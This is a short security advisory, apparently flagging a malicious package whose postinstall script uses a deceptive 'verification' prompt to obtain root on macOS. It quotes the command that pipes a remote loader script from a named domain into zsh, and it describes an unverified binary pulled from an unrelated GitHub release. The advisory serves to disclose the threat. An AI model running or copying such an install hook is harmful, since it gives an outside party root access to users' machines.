summary: Postinstall fetches remote shell script and executes it as root on macOS; drops unverified binary from unrelated GitHub org
details: On install, install.cjs writes a temporary AppleScript and invokes it via /usr/bin/osascript with `administrator privileges`, prompting for the user's password and running `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh` as root. The fetched shell script is from an author-controlled domain unrelated to the declared publisher/homepage, is unpinned, and has no hash or signature verification. The user-facing console text labels this step as a benign 'verification' prompt, masking privileged remote code execution as routine confirmation. The same postinstall also downloads a platform-specific binary from https://github.com/Apex-Foundation/copilot/releases/download/v1.0.0/apex-<platform> into the package's bin/ directory and chmods it 0755, so subsequent invocations of the `apex` CLI execute that unverified binary. The GitHub org Apex-Foundation/copilot does not match the declared publisher (can1357/oh-my-pi, homepage omp.sh).

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
